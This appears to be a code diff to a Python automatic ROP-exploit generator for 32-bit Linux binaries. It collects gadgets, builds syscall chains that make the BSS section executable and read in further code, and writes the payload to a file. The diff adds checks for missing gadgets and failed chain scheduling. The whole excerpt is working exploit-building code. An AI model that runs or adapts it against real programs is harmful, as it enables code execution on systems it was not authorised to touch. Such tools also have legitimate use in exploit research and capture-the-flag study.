@@ -30,17 +30,20 @@ def schedule(commands):
                     exploit += elem[1][0]
                 return exploit
             
-
     print("No valid order!")
     return -1
 
-def rop_exploit(binary_name):
+
+def rop_exploit(binary_name, padding, bss):
     
     rop = exploit_gadgets.ROPgadgets(binary_name)
     gadgets = get_gadgets(rop)
-    
+    if len(gadgets.gadgets) == 0:
+        return -1
+
     INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
-    (padding, data, bss) = input_length.get_everything(binary_name)
+    if INT80 == 0:
+        return -1
     
     # We need to align the BSS with the page size
     bss = (bss & 0xfffff000)
@@ -53,7 +56,11 @@ def rop_exploit(binary_name):
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
                 "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
                 "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)}
-    exploit += schedule(commands)
+    result = schedule(commands)
+    if result != -1:
+        exploit += result
+    else:
+        return -1
     exploit += INT80 # int 0x80
 
     print("Made BSS executable")
@@ -64,7 +71,11 @@ def rop_exploit(binary_name):
                 "ecx" : push_to_reg((bss + 4),"ecx",gadgets,rop), 
                 "edx" : push_to_reg(0xffffffff,"edx",gadgets,rop)}
 
-    exploit += schedule(commands)
+    result = schedule(commands)
+    if result != -1:
+        exploit += result
+    else:
+        return -1
     exploit += INT80
 
     print("Added read code")
@@ -83,8 +94,9 @@ def main():
     binary_name = sys.argv[1]
     file_name=sys.argv[2]
 
+    (padding, data, bss) = input_length.get_everything(binary_name)
     outfile=open(file_name, "wb")
-    outfile.write(rop_exploit(binary_name))
+    outfile.write(rop_exploit(binary_name, padding, bss))
     outfile.close()
 
 
